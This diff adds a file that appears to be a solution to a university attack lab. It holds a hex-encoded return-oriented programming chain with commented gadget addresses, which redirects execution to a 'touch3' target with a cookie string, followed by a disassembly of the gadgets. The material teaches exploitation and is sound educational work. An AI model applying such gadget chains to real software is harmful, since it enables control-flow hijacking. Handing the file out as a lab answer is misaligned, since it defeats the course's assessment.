@@ -1,0 +1,24 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+c6 1d 40 00 00 00 00 00 # mov %rsp,%rax #ret 
+86 1d 40 00 00 00 00 00 # mov %rax,%rdi #ret -----------------
+93 1d 40 00 00 00 00 00 # pop %rax #ret                       |
+48 00 00 00 00 00 00 00 # offset                              |
+d4 1d 40 00 00 00 00 00 # mov %eax,%ecx #ret                  |
+bf 1d 40 00 00 00 00 00 # mov %ecx,%edx #ret                  |-> offset
+db 1d 40 00 00 00 00 00 # mov %edx,%esi #ret                  |
+b1 1d 40 00 00 00 00 00 # lea (%rdi,%rsi,1),%rax #ret         |
+86 1d 40 00 00 00 00 00 # mov %rax,%rdi #ret                  |
+e3 1c 40 00 00 00 00 00 # *touch3 ----------------------------
+33 32 30 34 36 33 30 31 # assci of cookie
+
+0000000000000000 <.text>:
+   0:   48 89 e0                mov    %rsp,%rax            # 401dc6
+   3:   48 89 c7                mov    %rax,%rdi            # 401d86
+   6:   58                      pop    %rax                 # 401d93
+   7:   89 c1                   mov    %eax,%ecx            # 401dd4
+   9:   89 ca                   mov    %ecx,%edx            # 401dbf
+   b:   89 d6                   mov    %edx,%esi            # 401ddb
+   d:   48 8d 04 37             lea    (%rdi,%rsi,1),%rax   # 401db1
+  11:   48 89 c7                mov    %rax,%rdi            # 401d86
